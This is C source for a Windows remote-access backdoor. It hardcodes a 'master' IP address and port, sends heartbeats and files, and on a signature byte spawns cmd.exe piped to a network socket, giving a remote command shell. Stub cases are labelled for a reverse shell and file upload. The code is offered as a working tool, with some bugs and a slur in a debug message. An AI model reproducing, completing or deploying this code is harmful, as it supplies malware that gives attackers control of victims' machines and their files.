#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>


// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")


#define DEFAULT_PORT "27015"
#define DEBUG


const char _SIG_INIT[] = {0xfb, 0x00};
const char _SIG_FILE[] = {0xfb, 0x01};
const char _SIG_COUT[] = {0xfb, 0x02};
const char _SIG_SHLL[] = {0xfb, 0x03};
const char _SIG_HRBT[] = {0xff, 0xff};

void DBGLG(char buf[], ...){
    #ifdef DEBUG
    va_list args;
    int num = 0;
    for(int i = 0; buf[i] != '\0'; ++i){
        num += buf[i] == ':';
    }
    va_start(args, buf);
    if (!num) printf("%s",buf);
    else printf("%s%d\n",buf, va_arg(args, int));

    va_end(args);
    #endif
}

int MatchSig(char buf[2])
{
    printf("sig: %x %x\n", buf[0], buf[1]);
    if (buf[0] == (char)0xfb || buf[0] == (char)0xff){
        return buf[1];
    }
    return -1;
}

int WinsockInitialized(void)
{
    /* Checks if InitSetup was run*/
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET){
        return 0;
    }
    closesocket(s);
    return 1;
}

int InitSetup(void)
{
    /*Slave -> Master relationship
     Sets up WinSocket, has to be run once*/
    WSADATA wsaData;
    int iResult;
    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return -6;
    }
    return 0;
}

int IpSetupINIT(struct addrinfo** ad_info)
{
    /* Slave -> Master relation ship */
    struct addrinfo hints;
    int iResult;
    ZeroMemory( &hints, sizeof(hints) );
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo("45.143.93.119", DEFAULT_PORT, &hints, ad_info);
    if ( iResult != 0 ) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        return -5;
    }
    return 0;
}

int Connect(SOCKET* ConnectSocket, struct addrinfo* ad_info){
    /* Slave -> Master relationship
       Takes a pointer to an empty SOCKET and addrinto.
       Puts a hopefully connected socket to the provided pointer
       Returns >= 0 on success */
    int iResult;
    struct addrinfo* ptr = NULL;
    for(ptr=ad_info; ptr != NULL ;ptr=ptr->ai_next) {

        // Create a SOCKET for connecting to server
        *ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
            ptr->ai_protocol);
        if (*ConnectSocket == INVALID_SOCKET) {
            printf("socket failed with error: %d\n", WSAGetLastError());
            freeaddrinfo(ad_info);
            return -1;
        }

        // Connect to server.
        iResult = connect( *ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(*ConnectSocket);
            *ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }
    freeaddrinfo(ad_info);

    if (*ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        return -1;
    }
    return 0;
}

int SetupSocketTCP(struct addrinfo **ad_info){
    /* Master -> Slave relationship */
    int iResult;
    struct addrinfo hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;
    iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, ad_info);
    if ( iResult != 0 ) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return -1;
    }
    return 0;
}

int TransferFile(char* path, SOCKET ConnectSocket)
{
    /* Both way relationship, sends a file
     TODO add signature support*/
    int iResult;


    FILE* fd;
    fopen_s(&fd, path,"r");
    if (fd == NULL) {
        printf("Unable to open file!\n");
        closesocket(ConnectSocket);
        return -7;
    }
    fseek(fd, 0, SEEK_END);
    int nsz = ftell(fd);
    u_long sz = htonl((u_long)nsz);
    fseek(fd, 0, SEEK_SET);
    iResult = send( ConnectSocket, (char*)&sz, 4, 0 );
    if (iResult == SOCKET_ERROR) {
        printf("send failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        return -2;
    }
    char* buf = (char*)malloc(sz*sizeof(char));
    if(!buf){
        closesocket(ConnectSocket);
        return -3;
    }
    fread(buf, 1, nsz, fd);

    iResult = send( ConnectSocket, buf, nsz, 0 );
    if (iResult == SOCKET_ERROR) {
        printf("send failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        free(buf);
        return -2;
    }
    free(buf);
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        return -4;
    }
    // cleanup
    closesocket(ConnectSocket);

    return 0;
}



int HeartBeat(SOCKET s){
    /* Slave -> Master relationship*/
    int iResult;
    iResult = send(s, _SIG_HRBT, 2, 0);
    DBGLG("Sent heartbeat\n");
    return iResult;
}

int ScanOutPipe(HANDLE hStdoutRd, OVERLAPPED* readOverlapped, SOCKET sock){
    DWORD bytesRead;
    char buf[2048];
    memset(&buf, 0, 2048);
    // MANUAL SIZE BUFFER KILL ME
    int c = ReadFile(hStdoutRd, buf, 2048,&bytesRead, readOverlapped);
    // WaitForSingleObjectEx(readOverlapped->hEvent, 500, TRUE);
    if (send(sock, buf, strlen(buf), 0) < 0){
        perror("send in scanoutpipe died");
        return 1;
    }

    // WaitForSingleObjectEx(readOverlapped->hEvent, 500, TRUE);

    return 0;
}

int WriteInPipe(HANDLE hStdinWr, OVERLAPPED* writeOverlapped,  SOCKET sock){
    DWORD bytesWritten;
    int len = 0;
    char input[1024] = {0};
    len = recv(sock, (char*)&input, 1024, 0);
    if (len < 0){
        perror("recv in WriteInPipe died");
        return 1;
    }
    if (!WriteFile(hStdinWr, input, len, &bytesWritten, writeOverlapped)){
        perror("Writing to cmd died");
        return 1;
    }
    // WaitForSingleObject(writeOverlapped, 500);
    return 0;
}

int SetupServerTCP(SOCKET* sock, SOCKET* ListenSocket){
    int iResult;
    struct addrinfo *ad_info = NULL;

    if (!WinsockInitialized()){
        iResult = InitSetup();
        if (iResult < 0){
            return iResult;
        }
    }
    iResult = SetupSocketTCP(&ad_info);
    if (iResult < 0){
        perror("socket setup fail");
        return 1;
    }
    *ListenSocket = socket(ad_info->ai_family, ad_info->ai_socktype, ad_info->ai_protocol);
    if (ListenSocket == INVALID_SOCKET) {
        DBGLG("socket failed with error: \n", WSAGetLastError());
        freeaddrinfo(ad_info);
        WSACleanup();
        return 1;
    }
    iResult = bind( ListenSocket, ad_info->ai_addr, (int)ad_info->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        DBGLG("bind failed with error: \n", WSAGetLastError());
        freeaddrinfo(ad_info);
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }
    freeaddrinfo(ad_info);

    iResult = listen(ListenSocket, SOMAXCONN);
    if (iResult == SOCKET_ERROR) {
        DBGLG("listen failed with error: \n", WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }
}

int __cdecl main(int argc, char **argv)
{
    int iResult, sig;
    SOCKET ListenSocket = INVALID_SOCKET;
    SOCKET sock = INVALID_SOCKET;
    SetupServerTCP(&sock, &ListenSocket);

    /* TODO: Start a thread for heartbeating [IpSetup, Connect, HeartBeat, Close]*/
    while (1){
        // MAIN EVENT LOOP
        eventloop:
        char buf[2] = {0,0};
        DBGLG("Listening\n");
        sock = accept(ListenSocket, NULL, NULL);
        DBGLG("Connected\n");
        if (sock == INVALID_SOCKET) {
            DBGLG("accept failed with error: \n", WSAGetLastError());
            closesocket(ListenSocket);
            WSACleanup();
            return 1;
        }
        if (sock < 0)
        {
            perror("accept failed");
            goto eventloop;
        }
        iResult = recv(sock, (char*)&buf, 2, 0);
        if (iResult != 2){
            perror("Incorrect signature recieved dropping connection");
            closesocket(sock);
            goto eventloop;
        }
        sig = MatchSig(buf);
        if (sig < 0){
            perror("Invalid signature dropping connection");
            closesocket(sock);
            goto eventloop;
        }
        switch (sig){
            case 0x0:
                DBGLG("Got 0\n");
            /* INITIALIZE and should not be handled on client side*/
                break;
            case 0x1:
                DBGLG("Got 1\n");
            /* File transfer, presumably uploading to client */
                break;
            case 0x2:
                DBGLG("Got 2 starting shell\n");
                HANDLE hStdinRd, hStdinWr, hStdoutRd, hStdoutWr;
                SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

                // Create pipes for the child process's standard input and output.
                if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0) ||
                    !CreatePipe(&hStdinRd, &hStdinWr, &sa, 0))
                {
                    perror("failed at creating pipes for child process");
                    break;
                }

                // Set the bInheritHandle flag so the child process inherits the handles.
                sa.bInheritHandle = TRUE;

                // Create the child process.
                STARTUPINFO si = { sizeof(STARTUPINFO) };
                PROCESS_INFORMATION pi;
                si.dwFlags = STARTF_USESTDHANDLES;
                si.hStdInput = hStdinRd;
                si.hStdOutput = hStdoutWr;
                si.hStdError = hStdoutWr;
                OVERLAPPED writeOverlapped = { 0 };
                OVERLAPPED readOverlapped = { 0 };
                writeOverlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
                readOverlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
                if (!CreateProcess(NULL, "C:\\Windows\\System32\\cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
                {
                    perror("failed at creating process");
                    break;
                }

                // Close the write ends of the pipes in the parent process.
                CloseHandle(hStdoutWr);
                CloseHandle(hStdinRd);

                // Read from the output pipe and write to the input pipe.
                /* INITIAL CMD LOADING*/
                ScanOutPipe(hStdoutRd, &readOverlapped, sock);
                ScanOutPipe(hStdoutRd, &readOverlapped, sock);
                /*END OF LOADING*/
                while (1){
                    iResult = WriteInPipe(hStdinWr, &writeOverlapped ,sock);
                    if (iResult){
                        break;
                    }
                    iResult = ScanOutPipe(hStdoutRd, &readOverlapped, sock);
                    if(iResult){
                        break;
                    }
                }
                // Close the read end of the output pipe.
                CloseHandle(hStdoutRd);
                CloseHandle(hStdinWr);
                TerminateProcess(pi.hProcess, 0);
                // clean up
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            /* Individual command output master -> (cmd) ->slave -> (output) -> master*/
                break;
            case 0x3:
                DBGLG("Got 3\n");
            /* Reverse shell */
                break;
            case 0xff:
                DBGLG("Got ff\n");
            /* Heartbeat */
                break;
            default:
                DBGLG("Got retarded data\n");
        }
        closesocket(sock);
    }

    WSACleanup();
    return 0;

}
